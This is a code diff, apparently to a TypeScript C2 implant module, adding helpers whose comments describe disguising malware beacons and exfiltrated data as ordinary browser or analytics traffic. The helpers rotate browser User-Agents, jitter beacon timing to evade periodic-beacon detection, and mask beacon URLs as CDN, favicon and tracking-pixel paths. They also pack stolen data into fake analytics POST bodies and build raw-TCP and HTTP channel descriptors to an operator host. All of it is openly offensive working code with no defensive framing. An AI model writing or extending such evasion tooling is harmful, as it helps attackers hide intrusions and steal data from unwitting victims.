@@ -182,6 +182,103 @@ export function randomKey(): Uint8Array {
   return k;
 }
 
+// ─── TRAFFIC SHAPING HELPERS ──────────────────────────────────────────────────
+
+/** Randomized browser-like User-Agent strings for HTTP beacon disguise */
+export const BROWSER_USER_AGENTS = [
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+] as const;
+
+/** Pick a random User-Agent for each request */
+export function randomUserAgent(): string {
+  return BROWSER_USER_AGENTS[Math.floor(Math.random() * BROWSER_USER_AGENTS.length)]!;
+}
+
+/** Jittered sleep — evades periodic-beacon detection by adding noise to timing */
+export function beaconJitter(baseMs: number, spreadFactor = 0.5): number {
+  const spread = baseMs * spreadFactor;
+  return Math.floor(baseMs - spread + Math.random() * spread * 2);
+}
+
+/** Disguise beacon URL as a common analytics/CDN path */
+export function disguiseBeaconPath(token: string, seq: number): string {
+  const paths = [
+    `/cdn-cgi/beacon/expect-ct?t=${token}&s=${seq}`,
+    `/analytics/v1/collect?cid=${token}&seq=${seq}`,
+    `/favicon.ico?v=${token}&c=${seq}`,
+    `/api/telemetry?session=${token}&n=${seq}`,
+    `/pixel.gif?uid=${token}&e=pageview&seq=${seq}`,
+    `/metrics/heartbeat?id=${token}&seq=${seq}`,
+    `/__utm.gif?utmwv=5&utmn=${token}&utmp=/${seq}`,
+  ];
+  return paths[(Date.now() + seq) % paths.length]!;
+}
+
+/** Generate realistic Accept/Content-Type headers to mimic browser traffic */
+export function browserHeaders(refererHost = ""): Record<string, string> {
+  return {
+    "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language":  "en-US,en;q=0.9",
+    "Accept-Encoding":  "gzip, deflate, br",
+    "Cache-Control":    "no-cache",
+    "Connection":       "keep-alive",
+    "Pragma":           "no-cache",
+    "Sec-Fetch-Dest":   "empty",
+    "Sec-Fetch-Mode":   "cors",
+    "Sec-Fetch-Site":   refererHost ? "cross-site" : "same-origin",
+    ...(refererHost ? { "Referer": `https://${refererHost}/`, "Origin": `https://${refererHost}` } : {}),
+  };
+}
+
+/** Wrap exfil payload as a fake analytics POST body */
+export function packAsAnalyticsPayload(token: string, data: Uint8Array): string {
+  const b64 = btoa(String.fromCharCode(...Array.from(data)));
+  return `cid=${encodeURIComponent(token)}&t=event&ec=perf&ea=lcp&el=${encodeURIComponent(b64)}&ev=1`;
+}
+
+/** Multi-protocol channel descriptor for operator UI */
+export interface ChannelDescriptor {
+  protocol: "raw-tcp" | "http" | "http-analytics" | "dns-txt";
+  path:     string;
+  headers:  Record<string, string>;
+  ua:       string;
+  jitterMs: number;
+}
+
+export function buildChannelDescriptor(host: string, port: number, seq: number): ChannelDescriptor[] {
+  const ua = randomUserAgent();
+  return [
+    {
+      protocol: "raw-tcp",
+      path:     `${host}:${port}`,
+      headers:  {},
+      ua:       "",
+      jitterMs: beaconJitter(5000),
+    },
+    {
+      protocol: "http-analytics",
+      path:     `http://${host}:${port}${disguiseBeaconPath("TOKEN", seq)}`,
+      headers:  { ...browserHeaders(host), "User-Agent": ua },
+      ua,
+      jitterMs: beaconJitter(8000, 0.6),
+    },
+    {
+      protocol: "http",
+      path:     `http://${host}:${port}/api/telemetry`,
+      headers:  { ...browserHeaders(), "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded" },
+      ua,
+      jitterMs: beaconJitter(10000, 0.7),
+    },
+  ];
+}
+
 export function keyToHex(key: Uint8Array): string {
   return Array.from(key).map(b => b.toString(16).padStart(2, "0")).join("");
 }
